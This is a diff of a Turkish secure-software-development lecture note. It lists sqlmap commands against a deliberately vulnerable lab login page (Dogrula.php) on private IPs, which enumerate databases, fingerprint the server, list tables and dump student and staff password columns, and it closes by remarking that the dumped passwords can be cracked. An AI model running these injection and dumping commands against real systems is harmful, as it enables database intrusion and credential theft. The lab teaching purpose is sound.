@@ -1,6 +1,7 @@
 /*
 *
-* Use InsecureWebApplication repo in Github
+*  https://github.com/celalceken/InsecureWebApplication
+*
 */
 
 
@@ -16,27 +17,22 @@
 
 sqlmap
 
-// Ana klasörde bulunan InsecureWebApplication klasörü için tarama yapılmalı (mysql olduğu için daha güvensiz bir uygulama)
+// Ana klasörde bulunan InsecureWebApplication klasörü için tarama yapılmalı 
 
-
-Ayrıntılı bilgi için : https://github.com/sqlmapproject/sqlmap/wiki/Usage
+sqlmap hakkında ayrıntılı bilgi için : https://github.com/sqlmapproject/sqlmap/wiki/Usage
 
 
 --flush-session parametresi ile yeni oturum (yeni tarama) açılır...
-> sqlmap -u "http://192.168.96.103/SecureSoftwareDevelopment/Lecture4/InsecureWebApplication/Dogrula.php"
---data "personelNo=a&sifre=a" --dbs --level=5 --risk=5 --flush-session
-	(dbs: veritabanları)
-
-sqlmap -u "http://192.168.96.1/SecureSoftwareDevelopment/Lecture4/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" --dbs --level=5 --risk=4
-root@kali:~# setxkbmap tr
 
 
+265  sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" --dbs --level=5 --risk=3 --flush-session 
+266  sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" -D obs --tables
+267  sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" -D obs -T AkademikPersonel --dump
 
+> sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" -f (fingerprint) vt sürümü
+root@kali:~# sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" -f
 
-> sqlmap -u "http://192.168.2.7/GuvenliYazilimGelistirme/GuvenliYazilimGelistirme1/Dogrula.php" --data "personelNo=a&sifre=a" -f (fingerprint) vt sürümü
-root@kali:~# sqlmap -u "http://192.168.96.1/SecureSoftwareDevelopment/Lecture4/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" -f
-
-> sqlmap -u "http://192.168.2.7/GuvenliYazilimGelistirme/GuvenliYazilimGelistirme1/Dogrula.php" --data "personelNo=a&sifre=a" --current-user
+> sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" --current-user
 
 --hostname
 --current-db
@@ -46,13 +42,13 @@ root@kali:~# sqlmap -u "http://192.168.96.1/SecureSoftwareDevelopment/Lecture4/I
 --privileges
 --roles
 
-> sqlmap -u "http://192.168.2.7/GuvenliYazilimGelistirme/GuvenliYazilimGelistirme1/Dogrula.php" --data "personelNo=a&sifre=a" -D ob --tables
+> sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" -D ob --tables
 
 
-> sqlmap -u "http://192.168.2.7/GuvenliYazilimGelistirme/GuvenliYazilimGelistirme1/Dogrula.php" --data "personelNo=a&sifre=a" -D ob --tables --column
+> sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" -D ob --tables --column
 
 
-> sqlmap -u "http://172.16.0.1/GuvenliYazilimGelistirme/GuvenliYazilimGelistirme1/Dogrula.php" --data "personelNo=a&sifre=a" -D ob -T ogrenciler -C ogrenciNo,sifre --dump
+> sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" -D ob -T ogrenciler -C ogrenciNo,sifre --dump
 
 
 // Şifreler alındıktan sonra kırılması da sağlanabilir...
